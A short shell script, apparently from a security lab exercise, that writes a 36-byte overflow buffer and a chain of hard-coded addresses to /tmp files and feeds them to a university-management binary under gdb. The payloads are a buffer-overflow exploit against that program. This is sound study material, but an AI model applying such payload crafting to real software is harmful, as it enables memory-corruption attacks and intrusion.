#!/bin/sh
python3 -c "import sys; sys.stdout.buffer.write(36*b'B' + b'\xd0\xc5\xff\xff')" > /tmp/BUFFER_PAYLOAD
python3 -c "import sys; sys.stdout.buffer.write(b'\x2e\xb1\x04\x08' + b'\xa0\x0d\x05\x08' + b'\xa0\x0d\x05\x08' + b'\xff\x1c\x45\x6a')" > /tmp/INNER_PAYLOAD

gdb build/bin/btu \
	-ex "set args add WHATEVER '$(cat /tmp/INNER_PAYLOAD)' 1337 '$(cat /tmp/BUFFER_PAYLOAD)'" \
	# -ex "set disassembly-flavor intel" \
	# -ex "set debuginfod enabled off" \
	# -ex "b University::add_student" \
	# -ex "b University.cpp:31" \
	# -ex "b University.cpp:60" \
	# -ex "run"